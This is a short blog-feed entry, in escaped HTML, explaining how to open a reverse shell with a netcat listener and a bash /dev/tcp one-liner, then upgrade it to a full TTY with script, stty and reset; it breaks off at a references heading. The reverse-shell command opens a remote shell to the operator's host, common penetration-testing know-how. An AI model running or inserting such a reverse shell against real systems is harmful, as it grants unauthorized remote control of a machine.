        <content type="html" xml:base="https://shengtuo.me/blog/shell-upgrade/">&lt;h2 id=&quot;reverse-shell&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reverse-shell&quot; aria-label=&quot;Anchor link for: reverse-shell&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
Reverse Shell&lt;/h2&gt;
&lt;p&gt;A reverse shell is initiated from a remote machine and forward to our local port, so we can interact with the remote machine.&lt;/p&gt;
&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# myip: ip address of the local machine&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# myport: local port&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# On the local machine&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; -lnvp&lt;/span&gt;&lt;span&gt; $myport&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Waiting for the connection&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# On the remote machine&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; -i&lt;/span&gt;&lt;span class=&quot;z-3&quot;&gt; &amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; /dev/tcp/&lt;/span&gt;&lt;span&gt;$myip&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt;/&lt;/span&gt;&lt;span&gt;$myport&lt;/span&gt;&lt;span class=&quot;z-3&quot;&gt; 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;shell-upgrade&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#shell-upgrade&quot; aria-label=&quot;Anchor link for: shell-upgrade&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
Shell Upgrade&lt;/h2&gt;
&lt;p&gt;After setting up the reverse shell, run the following commands in the reverse shell to get a TTY.&lt;/p&gt;
&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Get a TTY&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; /dev/null -c bash&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Hit ^Z to send the local `nc` process to the background&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Disable &amp;quot;echo&amp;quot; for the local TTY and bring back `nc` process&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;stty&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; raw -echo&lt;/span&gt;&lt;span class=&quot;z-3&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;z-2&quot;&gt; fg&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Reset the remote shell&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;reset&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Note that, you won&amp;#39;t see anything now, but remember to type in &amp;quot;screen&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;references&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#references&quot; aria-label=&quot;Anchor link for: references&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
